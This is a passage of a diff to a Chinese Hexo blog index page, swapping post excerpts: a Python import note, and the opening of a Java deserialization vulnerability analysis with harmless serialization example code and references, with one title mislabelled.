class="line">		is.defaultReadObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><span id="ref_3">[3]:</span> <a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="external">https://github.com/frohoff/ysoserial/</a></p>
-<p><span id="ref_3">[2]:</span><br><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss" target="_blank" rel="external">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#jboss</a></p>
-<p><span id="ref_3">[3]:</span><br><a href="http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles" target="_blank" rel="external">http://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a></p>
-
+        <p>##Python import 遇到的几个问题</p>
+<p>python 作为一个脚本语言，具有很多优良的特性，笔者最喜欢的大概是他丰富的函数库，同时在工作中自己也会开发一些库来使用，这样就会经常用到 import 功能。譬如我们有如下两个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#bar.py</span><br><span class="line">bar_var=1</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#foo.py</span><br><span class="line">from bar import bar_var</span><br><span class="line">foo_var=1</span><br></pre></td></tr></table></figure>
+<p>在 foo.py 中我们引入了 bar 中的 bar_var 的变量。下面我们介绍 python 引用的机制及常见的问题。<br>
       
     </div>
     
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/import/">import</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+	</div>
+
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/12/05/Python-import-问题/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-JAVA-反序列化漏洞利用分析" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/11/01/JAVA-反序列化漏洞利用分析/" class="article-date">
+  	<time datetime="2016-11-01T10:25:21.000Z" itemprop="datePublished">2016-11-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/11/01/JAVA-反序列化漏洞利用分析/">Python import 问题</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Java-反序列化任意代码执行漏洞分析与利用"><a href="#Java-反序列化任意代码执行漏洞分析与利用" class="headerlink" title="Java 反序列化任意代码执行漏洞分析与利用"></a>Java 反序列化任意代码执行漏洞分析与利用</h1><p>&#160; &#160; &#160; &#160;2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[<a href="#ref_3">3</a>]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行。同年11月6日，FoxGlove Security安全团队的@breenmachine在一篇博客中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。<br>距离漏洞发布已经有了一年多的时间，仍然有很多网站仍未修复漏洞。</p>
+<h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h2><h3 id="1-1-Java序列化与反序列化"><a href="#1-1-Java序列化与反序列化" class="headerlink" title="1.1 Java序列化与反序列化"></a>1.1 Java序列化与反序列化</h3><p>&#160; &#160; &#160; &#160;简单的说，把对象转换为字节序列的过程称为对象的序列化。把字节序列恢复为对象的过程称为对象的反序列化。</p>
+<p>&#160; &#160; &#160; &#160;Java序列化的目的是为了将某些对象存储到磁盘上，从而长期保存，例如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。<br>或者当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。<br>一个序列化与反序列化的典型场景如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">public class deserial &#123;</span><br><span class="line">	public static void main(String args[]) throws Exception &#123;</span><br><span class="line">	    String obj = &quot;hello world!&quot;;</span><br><span class="line"></span><br><span class="line">	    // 将序列化对象写入文件object.db中</span><br><span class="line">	    FileOutputStream fos = new FileOutputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectOutputStream os = new ObjectOutputStream(fos);</span><br><span class="line">	    os.writeObject(obj);</span><br><span class="line">	    os.close();</span><br><span class="line"></span><br><span class="line">	    // 从文件object.db中读取数据</span><br><span class="line">	    FileInputStream fis = new FileInputStream(&quot;object.db&quot;);</span><br><span class="line">	    ObjectInputStream ois = new ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">	    // 通过反序列化恢复对象obj</span><br><span class="line">	    String obj2 = (String)ois.readObject();</span><br><span class="line">	    System.out.println(obj2);</span><br><span class="line">	    ois.close();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/反序列化/">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a  href="/2016/11/01/JAVA-反序列化漏洞利用分析/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -753,68 +805,6 @@
       
         <p class="article-more-link">
           <a  href="/2016/03/15/mongo-optimization/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-markdown-start" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/03/11/markdown-start/" class="article-date">
-  	<time datetime="2016-03-11T11:50:32.000Z" itemprop="datePublished">2016-03-11</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/03/11/markdown-start/">Markdown学习记录</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>We believe that writing is about content, about what you want to say – not about fancy formatting. 我们坚信写作写的是内容，所思所想，而不是花样格式。— Ulysses for Mac</p>
-</blockquote>
-<h2 id="写作原因"><a href="#写作原因" class="headerlink" title="写作原因:"></a>写作原因:</h2><p>一直在想定期总结一下自己遇到的技术问题和解决方式，顺便记录自己的成长过程。感谢GitHub提供了免费的空间，同时也感谢Hexo的作者，提供了这么好的静态网站制作工具。Hexo文章格式遵循Markdown语法，刚好记录下来，作为第一篇技术学习记录。</p>
-<h2 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h2><h3 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h3><p># 一级标题</p>
-<p>## 二级标题</p>
-<p>### 三级标题<br>以此类推，总共六级标题，建议在井号后加一个空格，这是最标准的 Markdown 语法。<br>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/03/11/markdown-start/#more">more >></a>
         </p>
       
       <div class="clearfix"></div>
